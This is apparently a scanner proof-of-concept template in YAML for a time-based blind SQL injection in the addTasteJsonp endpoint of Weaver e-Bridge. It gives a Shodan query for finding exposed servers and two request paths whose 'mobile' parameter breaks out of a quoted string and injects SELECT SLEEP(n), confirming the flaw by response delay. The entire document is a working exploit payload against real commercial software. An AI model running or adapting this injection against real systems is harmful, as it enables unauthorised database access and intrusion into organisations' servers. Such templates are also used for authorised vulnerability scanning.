id: poc-yaml-weaver-e-bridge-addtastejsonp-sqli
info:
  name: 泛微云桥 e-Bridge addTasteJsonp接口SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: weaver-ebridge
  shodan: app="泛微-云桥e-Bridge"
variables:
  t1: random_int(6,9)
  t2: t1 + 2
  t3: random_int(1,4)
  t4: t3 + 2
requests:
- method: GET
  path: /taste/addTasteJsonp?company=1&userName=1&jsonpcallback=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP({{.t1}})))mKjk)%20OR%20%27KQZm%27=%27REcX
  expression: 'status_code == 200

    && body == "1({status:1})"

    && duration > t1

    && duration < t2

    '
- method: GET
  path: /taste/addTasteJsonp?company=1&userName=1&jsonpcallback=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP({{.t3}})))mKjk)%20OR%20%27KQZm%27=%27REcX
  expression: 'status_code == 200

    && body == "1({status:1})"

    && duration > t3

    && duration < t4

    '
transport: http
